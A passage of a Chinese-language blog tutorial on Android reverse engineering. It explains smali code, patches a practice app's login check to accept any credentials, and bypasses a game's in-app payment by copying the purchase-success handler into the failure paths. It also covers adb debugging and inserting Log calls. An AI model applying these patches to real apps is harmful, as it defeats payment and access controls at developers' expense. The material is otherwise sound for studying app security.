class="comment">//本地寄存器int length=v1</span></span><br><span class="line"><span class="keyword">if</span>-nez v1，:cond_1        <span class="comment">//如果v1不等于0，这跳转至cond_1</span></span><br><span class="line">:cond_0                    <span class="comment">//cond_0标签</span></span><br><span class="line">:goto_0                    <span class="comment">//goto_0标签</span></span><br><span class="line"><span class="keyword">return</span> v2                  <span class="comment">//返回v2的值</span></span><br><span class="line">:cond_1                    <span class="comment">//开始执行cond_1标签代码</span></span><br><span class="line">const/<span class="number">4</span> v0,<span class="number">0x0</span>             <span class="comment">//4字节常量v0=0</span></span><br><span class="line">:local v0, <span class="string">&quot;i&quot;</span>:I           <span class="comment">//本地寄存器int i=v0</span></span><br><span class="line">:goto_1                    <span class="comment">//开始执行goto_1标签代码</span></span><br><span class="line"><span class="keyword">if</span>-lt v0, v1, :cond_2      <span class="comment">//如果v0小于v1,则跳转至cond_2</span></span><br><span class="line">const/<span class="number">16</span> v3,<span class="number">0x28</span>           <span class="comment">//接上：如果v0大于等于v1，则执行下面语句： 16字节常量v3=40</span></span><br><span class="line"><span class="keyword">if</span>-le v1,v3, :cond_0       <span class="comment">//接上：如果v1小于等于v3,则跳转至cond_0,即返回v2的值</span></span><br><span class="line">const/<span class="number">4</span> v2, <span class="number">0x0</span>            <span class="comment">//接上：如果v1大于v3,则4字节常量v2=0</span></span><br><span class="line">goto:goto_0                <span class="comment">//跳转至goto_0,即返回v2的值</span></span><br><span class="line">:cond_2                    <span class="comment">//cond_2标签</span></span><br><span class="line">xor-<span class="type">int</span>/lit8 v1, v1, <span class="number">0x3b</span>  <span class="comment">//将第二个v1寄存器中的值与0x3b（59）进行异或运算，得到的值赋值给第一个v1寄存器中</span></span><br><span class="line">add-<span class="type">int</span>/lit8 v0, v0, <span class="number">0x1</span>   <span class="comment">//将第二个v0寄存器中的值加上0x1(1)，所得的值放入第一个v0寄存器中</span></span><br><span class="line">goto:goto_1                <span class="comment">//跳转值goto_1标签，这里可以看到cond_2实际上是一个for循环，而不是简单的IF判断</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">1</span>;</span><br><span class="line">v1 = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (v1 != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    v0 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(v0 &lt; v1)</span><br><span class="line">    &#123;</span><br><span class="line">v1 = v1 ^ <span class="number">59</span>;</span><br><span class="line">v0 = v0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v3 = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">if</span>(v1 &lt;= v3)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-4-寄存器"><a href="#1-4-寄存器" class="headerlink" title="1.4 寄存器"></a>1.4 寄存器</h2><p>在smali里的所有操作都必须经过寄存器来进行：</p><ul><li>本地寄存器用v开头数字结尾的符号来表示，如v0, v1, v2…</li><li>参数寄存器则使用p开头数字结尾的符号来表示，如p0, p1, p2…</li></ul><p>特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个参数，p2表示函数的第二个参数…而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法)。</p><h3 id="1-4-1-简单对象分析"><a href="#1-4-1-简单对象分析" class="headerlink" title="1.4.1 简单对象分析"></a>1.4.1 简单对象分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const/<span class="number">4</span> v0, <span class="number">0x1</span></span><br><span class="line">iput-<span class="type">boolean</span> v0, p0, Lcom/aaa;-&gt;IsRegistered:Z</span><br></pre></td></tr></table></figure><p>它使用了本地寄存器v0，并把值0x1存到v0中。用iput-boolean这个指令把v0中存的值存放到com.aaa.IsRegistered这个成员变量中。即相当于：<code>this.IsRegistered=true;</code>。</p><h1 id="2-破解第一个Android程序"><a href="#2-破解第一个Android程序" class="headerlink" title="2. 破解第一个Android程序"></a>2. 破解第一个Android程序</h1><p>破解Android程序需要静态反编译程序Android Killer，打开后第一步配置JDK的安装路径。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AEjdk.png" class="" title="配置jdk"><p>从 <a href="https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar">https://down.52pojie.cn/Tools/Android_Tools/ShakaApktool_3.0.0-20170503-release.jar</a> 下载ShakaApktool_3.0.0-20170503-release.jar，将它放到<code>AndroidKiller_v1.3.1\bin\apktool\apktool</code>目录下，按照下图完成操作。</p><img src="/posts/15be101a/%E6%9B%B4%E6%94%B9apktool.png" class="" title="更改apktool"><p>将需要反编译的<code>.apk</code>文件拖进Android Killer后会自动反编译，但最后显示“正在反编译APK源码，请稍等…”时可能会卡住，需要关闭软件再次打开。</p><img src="/posts/15be101a/%E5%BC%82%E5%B8%B8.png" class="" title="异常"><p>找到历史工程重新打开<code>.apk</code>文件，点击入口即可看到smali文件。</p><img src="/posts/15be101a/%E6%88%90%E5%8A%9F%E5%8F%8D%E7%BC%96%E8%AF%91.png" class="" title="成功反编译"><p>如果经常卡住可以试试替换AK目录下的<code>rtl230.bpl</code> <a href="https://www.52pojie.cn/thread-658341-1-1.html">https://www.52pojie.cn/thread-658341-1-1.html</a> 。</p><img src="/posts/15be101a/smali%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90.png" class="" title="smali流程分析"><p>既然了解了流程，就可以动手破解程序了。</p><p>第一种：知道了账户密码，可直接拿那个账户密码登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：hfdcxy</span><br><span class="line">密码：1234</span><br></pre></td></tr></table></figure><p>第二种：将验证账户密码的两条跳转语句修改。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0-&gt;<span class="keyword">if</span>-nez v0, :cond_0</span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0-&gt;<span class="keyword">if</span>-nez v0, :cond_0</span><br></pre></td></tr></table></figure><p>第三种：直接将验证账户密码的两条跳转语句删除。</p><p>第四种：用goto语句直接跳到登录成功处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">move-result v0</span><br><span class="line"></span><br><span class="line">goto :goto_3#添加goto</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">const-string v0, <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;p2, v0&#125;, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z</span><br><span class="line"></span><br><span class="line">move-result v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>-eqz v0, :cond_0</span><br><span class="line"></span><br><span class="line">.line <span class="number">30</span></span><br><span class="line">:goto_3#添加goto</span><br><span class="line">const-string v0, <span class="string">&quot;\u767b\u5f55\u6210\u529f&quot;</span>#Unicode编码，“登录成功”</span><br></pre></td></tr></table></figure><p>smali修改完成后 Ctrl+S 保存，点击左上角的编译。</p><img src="/posts/15be101a/%E7%BC%96%E8%AF%91%E6%88%90%E5%8A%9F.png" class="" title="编译成功"><p>下载雷电模拟器 <a href="http://www.ldmnq.com/">http://www.ldmnq.com/</a> 充当手机，可以在电脑上运行<code>.apk</code>文件，找到雷电模拟器设备，安装。</p><img src="/posts/15be101a/%E5%AE%89%E8%A3%85.png" class="" title="安装apk"><p>然后在雷电模拟器中运行程序，输入错误的用户名和密码会提示登录成功，说明破解成功。</p><h1 id="3-破解第一个Android游戏"><a href="#3-破解第一个Android游戏" class="headerlink" title="3. 破解第一个Android游戏"></a>3. 破解第一个Android游戏</h1><p>运行一下程序，发现购买会出现“支付失败”字样，其Unicode为<code>\u652F\u4ED8\u5931\u8D25</code>。拖入AK反编译，按照下图搜索字符串，但没有找到。</p><img src="/posts/15be101a/%E6%90%9C%E7%B4%A2%E5%A4%B1%E8%B4%A5.png" class="" title="搜索失败"><p>再找“失败”，可直接在搜索框输入“失败”，再点左下角的编码转换即可转换为Unicode码。找到很多有关“失败”的字符串，一一排除。最后找到一个“购买失败”。</p><img src="/posts/15be101a/%E8%B4%AD%E4%B9%B0%E5%A4%B1%E8%B4%A5.png" class="" title="购买失败"><p>再上下看看可以看到有“购买取消”、“购买成功”等字样。如果看smali难看懂，可以转换成java源码，但转换的源码可读性比较差，还是建议读smali，而且修改必须是在smali里修改才可以成功编译。</p><img src="/posts/15be101a/%E8%BD%AC%E6%8D%A2java%E6%BA%90%E7%A0%81.png" class="" title="转换java源码"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultCancel</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#以上为支付取消的代码</span><br><span class="line">    </span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultFalse</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#支付失败</span><br><span class="line">    </span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">payResultSuccess</span><span class="params">()</span>V</span><br><span class="line">...</span><br><span class="line">.end method#支付成功</span><br></pre></td></tr></table></figure><p>首先来个简单粗暴的方法，直接将<code>public void payResultSuccess()</code>方法里的代码全都复制到<code>public void payResultCancel()</code>和<code>public void payResultFalse()</code>中。再删除可能会产生费用的危险权限：在<code>AndroidManifest.xml</code>里搜索（或者直接搜索）<code>android.permission.SEND_SMS</code> 和 <code>android.permission.CALL_PHONE</code>，删掉 <code>&lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;/&gt;</code> 和 <code>&lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;/&gt;</code> 即可。</p><p>第二种方法，再观察一下代码，到底是哪里开始分岔到“购买成功”、“购买取消”、“购买失败”的呢？搜索payResultFalse找到有跳转处的地方。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81.png" class="" title="修改代码"><p>同上，再删除可能会产生费用的危险权限，编译。</p><h1 id="4-AS动态调试smali代码"><a href="#4-AS动态调试smali代码" class="headerlink" title="4. AS动态调试smali代码"></a>4. AS动态调试smali代码</h1><p>下载Android Studio，这里有个非常大的坑耗了我两天时间，由于在官网下载不了，导致我去别的地方下载了无数版本的AS，最后安装smalidea插件造成各种问题。</p><p>解决办法：把官网链接https改为http即可。</p><p><a href="http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe">http://redirector.gvt1.com/edgedl/android/studio/install/2021.1.1.22/android-studio-2021.1.1.22-windows.exe</a></p><p>动态调试需要smalidea插件，下载最新版的<code>smalidea-0.06.zip</code>压缩包。最后直接导入插件，不要解压。安装、导入自行百度。可以新建一个项目直接连入模拟器看AS是否能够正常运行。第一次新建项目花费时间长一点，我不会说我新建一个项目花了15分钟！！！</p><p>将<code>.apk</code>文件拖进AK反编译成<code>.smali</code>文件，文件入口为<code>hfdcxy.com.myapplication.MainActivity</code>。在<code>application</code>标签里找<code>android:debuggable=&quot;true&quot;</code>这句代码。如果没有这句代码就调试不了，如果是<code>false</code>则改为<code>true</code>，重新编译签名。将新编译好的<code>.apk</code>安装在模拟器上。</p><img src="/posts/15be101a/debuggertrue.png" class="" title="debuggertrue"><p>在<code>.apk</code>文件右键，打开文件路径。</p><img src="/posts/15be101a/%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84.jpg" class="" title="打开文件路径"><p>把整个project目录复制到某处，用AS导入。给smali目录设置Sources Root。</p><img src="/posts/15be101a/sourcesroot.jpg" class="" title="sourcesroot"><p>Run-&gt;Edit configurations-&gt;+-&gt;Remote JVM Debug-&gt;设置Name，设置端口号为8700。</p><img src="/posts/15be101a/%E8%AE%BE%E7%BD%AEremote.png" class="" title="设置remote"><p>打开CMD，运行以下命令，将会显示以下信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity</span><br><span class="line">Starting: Intent &#123; cmp=hfdcxy.com.myapplication/.MainActivity &#125;</span><br></pre></td></tr></table></figure><p>如果显示“’adb’ 不是内部或外部命令，也不是可运行的程序或批处理文件。”请看 <a href="https://www.cnblogs.com/plsmile/p/11172693.html">https://www.cnblogs.com/plsmile/p/11172693.html</a></p><p>执行完第二条adb后，模拟器进入调试页面，记下PID为2160。不要点模拟器任何东西！！</p><img src="/posts/15be101a/%E8%B0%83%E8%AF%95%E9%A1%B5%E9%9D%A2.png" class="" title="调试页面"><p>绑定远程调试窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:8700 jdwp:2160</span><br><span class="line">8700</span><br></pre></td></tr></table></figure><p>回到AS设置断点，Run-&gt;Attch Debugger to Android Process</p><img src="/posts/15be101a/%E4%B8%8B%E6%96%AD.png" class="" title="下断点"><img src="/posts/15be101a/%E4%B8%8B%E6%96%AD2.png" class="" title="下断点"><p>回到模拟器，输入用户名和密码，点击登录。AS停在断点处，看到我们刚才输入的变量。</p><img src="/posts/15be101a/%E6%96%AD%E7%82%B93.png" class="" title="下断点"><p>单步F8，运行F9，与OD一样。可以下多几个断点，看寄存器的值，但需要自己添加想看的寄存器。</p><img src="/posts/15be101a/%E5%AF%84%E5%AD%98%E5%99%A8%E5%80%BC.png" class="" title="寄存器值"><h1 id="5-在smali代码中插入Log"><a href="#5-在smali代码中插入Log" class="headerlink" title="5. 在smali代码中插入Log"></a>5. 在smali代码中插入Log</h1><p>新建一个项目在MainActivity.java里面写一段switch case语句。注意，新建时语言要选择Java。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span></span><br><span class="line">&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        name = <span class="string">&quot;v5le0n9&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span>(name)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;v5le0n9&quot;</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;v5le0n9哈哈&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;l30n9ry0n&quot;</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;l30n9ry0n啦啦&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;没有符合的name值&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击三角符号运行，或Shift+F10，程序被安装到模拟器上。在Logcat查找“hello”，找到对应Log。</p><img src="/posts/15be101a/Log.png" class="" title="Log"><p>要想<code>.apk</code>文件保存在电脑上，按照下图操作。</p><img src="/posts/15be101a/buildapk.jpg" class="" title="build apk"><p>在<code>D:\Java\Android\MyApplication\app\build\intermediates\apk\debug</code>找到<code>.apk</code>文件。拖进AK反编译。点击入口进入MainActivity.smali，分析代码。</p><p>注意，能修改smali文件的前提是smali文件没有丢失，否则修改了也不能编译成功。再注意，为什么我们编写出来的程序放到AK反编译会显示文件已丢失？可能是因为Android Studio2.0+的Instant Run导致的。</p><p>解决方法：关闭Android Stuio的Instant Run：File -&gt; Setting -&gt; Build, Execution，Deployment -&gt; Debugger -&gt; HotSwap ，取消选中，点击OK。点击Build -&gt; APK重新打包。</p><img src="/posts/15be101a/instantrun.png" class="" title="instantrun"><p>结果还是不行！！直接生成release版本的apk试试，build -&gt;  Geberate signed apk -&gt; APK。如果没有keystore则需要创建一个新的。</p><p>创建keystore看 <a href="https://blog.csdn.net/qq_24349695/article/details/78540982">https://blog.csdn.net/qq_24349695/article/details/78540982</a></p><p>在点击finish时又给我抛出错误：<code>Error:Execution failed for task ‘:app:lintVitalRelease’</code>，解决方法：</p><p>在app的build.gradle里的android{}中添加如下代码，然后再次运行Generate Signed Apk。例如： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">android&#123;</span><br><span class="line">    lintOptions &#123;</span><br><span class="line">        checkReleaseBuilds <span class="literal">false</span></span><br><span class="line">        abortOnError <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次用release版本终于没有丢失smali文件了。已知代码运行出现的Log是<code>:cond_1</code>里面的信息，所以在<code>:cond_1</code>添加我们想看到的信息，保存编译。</p><img src="/posts/15be101a/%E6%B7%BB%E5%8A%A0smali%E4%BB%A3%E7%A0%81.png" class="" title="添加smali代码"><p>AK连上模拟器，因为模拟器之前有我们在AS直接安装的程序，所以先卸载，再编译安装修改过的程序。回到AS就可以看到多了一条Log信息，但AS中的java语言并没有被修改。</p><img src="/posts/15be101a/ASLog.png" class="" title="AS中多了一条Log信息"><p><strong>所以Log有什么用呢？很多情况下插入Log是为了打印出程序中某个变量的值。</strong></p><p>用以下程序完成三个任务：</p><ol><li><p>添加Log打印出fun2,fun3的值 (其实就是函数的返回值)</p></li><li><p>添加Log打印出fun3里面String类型str的值</p></li><li><p>添加Log打印出fun3里面int类型value3的值 </p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        fun1();</span><br><span class="line">        fun2();</span><br><span class="line">        fun3();</span><br><span class="line">        Log.i(<span class="string">&quot;这个值是&quot;</span>,String.valueOf(fun1()));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fun1</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> Test.value;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value2</span> <span class="operator">=</span> Test.value2;</span><br><span class="line">        <span class="keyword">return</span> value2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fun3</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Test.str;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Test.str2;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value3</span> <span class="operator">=</span> Test.value3;</span><br><span class="line">        <span class="keyword">return</span> str2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">888</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="number">777</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value3</span> <span class="operator">=</span> <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;www.52pojie.cn&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;码完代码去看东方明珠&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/1.png" class="" title="运行程序"><p>一样release版本拿去AK反编译。</p><p>任务一：添加Log打印出fun2, fun3的值</p><img src="/posts/15be101a/2.png" class="" title="打印fun1的值"><p><code>.line 17</code>是执行Log代码的内容，有趣的是在AS中<code>Log.i(&quot;这个值是&quot;,String.valueOf(fun1()));</code>刚好是第17行。</p><p>由于fun2和fun1的返回值类型一致，所以可直接复制这些代码，区别只是将fun1改为fun2。</p><img src="/posts/15be101a/3.png" class="" title="返回fun2的值"><p>fun2和fun3函数都是int类型，通过<code>String.valueOf</code>这个函数转换成的String类型。但是fun3这个函数本身就是String类型，这里如果还通过<code>String.valueOf</code>函数转换的话程序会报错。所以将执行<code>String.valueOf</code>的代码去掉即可。</p><img src="/posts/15be101a/4.png" class="" title="返回fun3的值"><p>保存-&gt;卸载-&gt;编译-&gt;安装。</p><img src="/posts/15be101a/5.png" class="" title="Log显示fun1,fun2,fun3返回值"><p>任务二：添加Log打印出fun3里面String类型str的值</p><img src="/posts/15be101a/6.png" class="" title="fun3中的smali代码"><p>翻译一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">fun3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> str;</span><br><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> str2;</span><br><span class="line"><span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> value3;</span><br><span class="line"><span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即str的值被str2覆盖了，所以可以直接删掉<code>.line 33</code>代码。</p><img src="/posts/15be101a/7.png" class="" title="注释33行代码"><img src="/posts/15be101a/8.png" class="" title="显示str的值"><p>任务三：添加Log打印出fun3里面int类型value3的值 </p><p>将fun3的smali代码按照fun2的smali代码修改返回值类型。</p><img src="/posts/15be101a/9.png" class="" title="修改返回值类型"><img src="/posts/15be101a/11.png" class="" title="修改返回值类型"><p>最后还要添加修改Log处的代码。</p><img src="/posts/15be101a/10.png" class="" title="修改返回值类型"><img src="/posts/15be101a/12.png" class="" title="显示value3的值"><h1 id="6-编写第一个so"><a href="#6-编写第一个so" class="headerlink" title="6. 编写第一个so"></a>6. 编写第一个so</h1><p>Android开发中，我们经常会用到<code>.so</code>文件。原因有很多，比如部分方法不想暴露，如加密规则。比如部分秘钥需要存储，哪怕最简单的一个String我们使用.so调用获取这个String，也比直接明文写在代码中要来的安全。那么逆向破解也是一样， 为了避免以后破解so时知其然而不知其所以然，要破解一个so就得先学习这个so是怎么编写的。</p><p>生成so文件需要NDK，由于本人安装NDK安装得太混乱了，出了各种各种的问题最后莫名其妙就成功了，所以以下步骤仅供参考，如果发现错误及时百度。</p><p>创建一个native C++项目，一路next。</p><img src="/posts/15be101a/C++.png" class="" title="C++"><p>创建项目时会自动下载NDK，所以不用管。及时看build窗口信息，问题或异常会在build窗口显示。可以看到在<code>D:\Java\Android\sdk\ndk\21.4.7075529</code>就下载好了ndk的21.4版本。</p><p>打开Project的<code>local.properties</code>文件添加NDK路径。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AEDNK.png" class="" title="配置NDK"><p>此时，可以在 File -&gt; Project Structure -&gt; SDK Location 就可以看到NDK路径了，说明NDK已经安装好并且能用了。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AENDK.png" class="" title="配置NDK"><p>那么现在就可以正式编写so文件了。在<code>MainActivity.java</code>的父目录里新建一个类，命名为<code>myJNI</code>。</p><img src="/posts/15be101a/%E6%96%B0%E5%BB%BA%E7%B1%BB.jpg" class="" title="新建一个类"><p>声明native方法。这个类是java与C/C++交互的中介，方法由java声明，由C/C++实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myJNI</span> &#123;</span><br><span class="line">　　<span class="comment">//加载so库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;JniTest&quot;</span>);<span class="comment">//so库名字</span></span><br><span class="line">    &#125;</span><br><span class="line">　　<span class="comment">//native方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">sayHello</span><span class="params">()</span>;<span class="comment">//在so库里增加sayHello()功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在左侧栏右键<code>myJNI.java</code>，复制路径，在AS下面的终端编译<code>myJNI</code>类，生成<code>myJNI.class</code>文件。由于注释出错(?)，所以我把注释去掉了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 